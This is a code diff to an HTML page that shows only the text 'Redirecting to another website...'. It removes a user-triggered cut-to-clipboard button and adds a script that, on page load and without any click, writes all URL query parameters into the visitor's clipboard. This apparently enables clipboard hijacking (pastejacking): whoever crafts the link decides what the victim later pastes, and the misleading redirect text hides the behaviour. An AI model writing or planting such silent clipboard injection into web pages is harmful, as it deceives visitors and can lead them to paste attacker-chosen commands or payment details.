@@ -9,13 +9,34 @@
 </head>
 <body>
     <p>Redirecting to another website...</p>
-    <!-- Add any other content here -->
-    <!-- Target -->
+
     <textarea id="bar">Mussum ipsum cacilds...</textarea>
-    
-    <!-- Trigger -->
-    <button class="btn" data-clipboard-action="cut" data-clipboard-target="#bar">
-        Cut to clipboard
-    </button>
+
+    <script type="text/javascript">
+        // Function to set data to clipboard
+        function setDataToClipboard(data) {
+            // Create a temporary textarea element
+            var textarea = document.createElement("textarea");
+            textarea.value = data;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand("copy"); // Copy the data to clipboard
+            document.body.removeChild(textarea); // Clean up
+
+            console.log("This is a debug message");
+        }
+
+        // Execute when the window is fully loaded
+        window.onload = function() {
+            // Extract query parameters from the URL and store in clipboard
+            var urlParams = new URLSearchParams(window.location.search);
+            var dataToStore = ""; // Initialize data to store
+            urlParams.forEach(function(value, key) {
+                dataToStore += key + "=" + value + "\n"; // Format data as key=value
+            });
+
+            setDataToClipboard(dataToStore); // Store data to clipboard
+        };
+    </script>
 </body>
 </html>
